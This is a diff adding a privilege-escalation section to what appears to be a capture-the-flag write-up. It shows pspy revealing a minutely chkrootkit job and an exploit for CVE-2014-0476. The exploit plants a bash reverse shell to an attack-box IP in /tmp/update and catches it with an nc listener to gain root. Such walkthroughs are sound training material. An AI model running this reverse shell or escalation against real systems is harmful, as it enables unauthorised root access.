@@ -172,9 +172,30 @@ export SHELL=bash
 
 
 ## Privilege Escalation:
-+ x
++ Transfer pspy [1](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64) [2](https://vk9-sec.com/how-to-enumerate-services-in-use-with-pspy/) to the target.
++ `./pspy64`
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a68cfde5-7600-4d85-b71a-28f878eb0eed)
 
++ **chkrootkit** is being run every minute.
++ `searchsploit chkrootkit`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bbb4ab93-c571-4d45-8041-e168353a382a)
+
++ [CVE-2014-0476](https://www.exploit-db.com/exploits/33899)
+
++ Create **update** file in /tmp directory.
++ Add this reverse payload into the **update** file.
+```
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.18/5555 0>&1
+```
+
++ `chmod +x update`
++ Start listener on your attack machine: `nc -lnvp 5555`
++ Get root shell.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/fd0fdf8a-98b4-43b5-af22-3482b41eafe9)
 
 
 
